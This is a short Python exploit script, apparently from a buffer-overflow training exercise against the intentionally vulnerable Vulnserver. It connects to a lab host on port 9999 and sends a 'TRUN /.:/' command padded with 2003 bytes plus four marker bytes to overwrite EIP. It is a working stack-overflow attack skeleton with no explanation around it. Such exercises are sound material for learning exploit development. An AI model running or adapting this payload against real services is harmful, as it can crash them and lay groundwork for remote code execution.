#!/usr/bin/python

import sys, socket

#2003 is the length of bytes to the EIP as per finding the offset 
#
shellcode = "A" * 2003 + "B" * 4
try:

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Attempting to connect to server")
	s.connect(('192.168.56.1', 9999))
	print("[+] Sending the payload...\n")
	payload = "TRUN /.:/" + shellcode
	s.send((payload.encode()))
	s.close()
        
except:
	print("Error connecting to server")
	sys.exit()
